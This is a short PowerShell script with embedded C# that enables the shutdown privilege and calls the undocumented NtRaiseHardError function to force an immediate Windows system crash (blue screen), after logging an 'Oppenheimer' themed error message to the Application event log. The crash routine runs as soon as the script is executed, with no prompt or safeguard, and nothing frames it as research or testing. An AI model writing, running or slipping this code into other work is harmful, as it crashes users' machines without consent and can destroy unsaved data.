$eventSource = "InvokeDeathScript"
$eventLog = "Application"

# Check if the event source exists; if not, create it
if (-not [System.Diagnostics.EventLog]::SourceExists($eventSource)) {
    [System.Diagnostics.EventLog]::CreateEventSource($eventSource, $eventLog)
}

function Invoke-Death {
    $source = @"
using System;
using System.Runtime.InteropServices;

public static class CS {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    public static void InvokeDeath() {
        bool previousValue;
        uint response;

        RtlAdjustPrivilege(19, true, false, out previousValue);

        string errorMessage = "Oppenheimer special: Fatal system error occurred!";
        IntPtr errorMessagePtr = Marshal.StringToHGlobalUni(errorMessage);

        NtRaiseHardError(0xc0000420, 1, 0, errorMessagePtr, 6, out response);

        Marshal.FreeHGlobal(errorMessagePtr);
    }
}

"@

    # Compile the C# code
    $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $compilerParameters.CompilerOptions = '/unsafe'
    $compiledType = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $compilerParameters

    # Call the method
    [CS]::InvokeDeath()
}



Write-EventLog -LogName $eventLog -Source $eventSource -EventId 1 -EntryType Error -Message "Now I am become Death, the destroyer of worlds."


Invoke-Death